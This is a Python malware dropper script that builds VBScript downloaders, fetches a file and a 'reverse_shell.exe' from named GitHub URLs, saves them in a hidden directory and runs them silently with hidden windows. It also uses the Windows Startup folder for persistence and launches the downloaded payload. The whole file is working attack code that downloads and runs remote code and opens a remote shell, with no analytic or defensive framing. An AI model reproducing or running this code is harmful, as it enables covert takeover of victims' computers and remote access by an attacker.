import maldir,download,os,base64,subprocess,time

maldir.create()

UserDir = os.path.expanduser( '~' )
vbsname = "vbscript.vbs"
downloadName = "test.txt"
startup = r"%a"+"ppdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
URL = "https://raw.githubusercontent.com/pyth0g/project/main/test.txt"
exeURL = "https://github.com/pyth0g/rshell/raw/master/reverse_shell.exe"
MalDir = maldir.Get()
exeName = "executable.exe"
downloadLocation = f"{MalDir}\\{downloadName}"
exeLocation = f"{MalDir}\\{exeName}"

download.send(f'''On Error Resume Next
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", "{URL}", False
http.Send
If http.Status = 200 Then
    Set stream = CreateObject("Adodb.Stream")
     stream.Open
   stream.Type = 1
       stream.Write http.ResponseBody
        stream.SaveToFile "{downloadLocation}", 2
        stream.Close
End If
On Error GoTo 0''')
try:
    with open(f"{MalDir}\\download.vbs","x") as f:
        f.write(str(base64.b64decode(download.getcode())).replace("b'","").replace("'","").replace(r"\n","\n"))
except FileExistsError:
    pass
subprocess.Popen(f"cscript {MalDir}\\download.vbs",shell=True,creationflags=subprocess.CREATE_NO_WINDOW)

download.send(f'''On Error Resume Next
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", "{exeURL}", False
http.Send
If http.Status = 200 Then
    Set stream = CreateObject("Adodb.Stream")
     stream.Open
   stream.Type = 1
       stream.Write http.ResponseBody
        stream.SaveToFile "{exeLocation}", 2
        stream.Close
End If
On Error GoTo 0''')

try:
    with open(f"{MalDir}\\downloadexe.vbs","x") as f:
        f.write(str(base64.b64decode(download.getcode())).replace("b'","").replace("'","").replace(r"\n","\n"))
except FileExistsError:
    pass
subprocess.Popen(f"cscript {MalDir}\\downloadexe.vbs",shell=True,creationflags=subprocess.CREATE_NO_WINDOW)
time.sleep(2)
subprocess.Popen(f'cscript "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\vbscript.vbs"', stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
subprocess.Popen(f"start {downloadLocation}",shell=True,creationflags=subprocess.CREATE_NO_WINDOW)